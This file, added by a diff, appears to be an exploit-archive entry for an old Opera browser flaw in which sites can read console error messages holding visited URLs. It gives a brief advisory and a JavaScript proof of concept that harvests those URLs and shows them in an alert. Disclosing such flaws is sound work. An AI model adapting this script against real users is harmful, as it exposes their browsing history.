@@ -1,0 +1,15 @@
+source: http://www.securityfocus.com/bid/6759/info
+
+It has been reported that Opera fails to ensure that a remote site has proper authorization before executing some methods used to access error messages stored in the Opera console.
+
+This issue is further exacerbated by the fact that error messages also contain the URL of the site that caused the issue. This can be exploited by a malicious attacker to obtain a listing of the victim user's Web browsing habits for, potentially, malicious purposes.
+
+var sMsg,
+sFinal="",
+iLen=opera.errorIndex();
+
+for (var iErr=0;iErr<iLen;iErr++) {
+sMsg=opera.errorMessage(iErr);
+if (sMsg && /(https?:\/\/\S+)/i.test(sMsg)) sFinal+=RegExp.$1+"\n";
+}
+alert(sFinal);
